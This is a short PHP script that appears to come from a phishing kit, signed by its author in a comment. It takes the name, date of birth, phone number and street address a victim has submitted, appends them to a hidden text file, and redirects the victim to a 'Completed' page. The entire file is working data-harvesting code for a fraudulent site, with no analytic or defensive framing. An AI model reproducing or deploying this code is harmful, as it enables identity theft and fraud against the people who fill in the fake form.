<?php
include '../Mckay‎‏/zero33.php';
include 'zero33.php';
/*
##############################################################
                           LOVE is fake
##############################################################
                           MR fake is me	
##############################################################
              https://web.facebook.com/yackson.garcia.161	
##############################################################			  
*/

$zeidan .="=========== <[ More information ]> ===========\n";
$zeidan .="Legal First Name	  : ".$_POST['n_card']."\n";
$zeidan .="Legal Last Name		  : ".$_POST['n_last']."\n";
$zeidan .="Data Of Birth              : ".$_POST['n_data']."\n";
$zeidan .="Phone Number               : ".$_POST['n_phone']."\n";
$zeidan .="Street Address                : ".$_POST['sa']."\n";
$zeidan .="------------------------------------------\n";
$zeidan .="=====<[aim for the impossible zeidane]>=====\n";
$zeidan .="------------------------------------------\n";
$file = fopen("../../Attention.txt", 'a');
fwrite($file, $zeidan);
header ("Location:../../usa/Completed.php");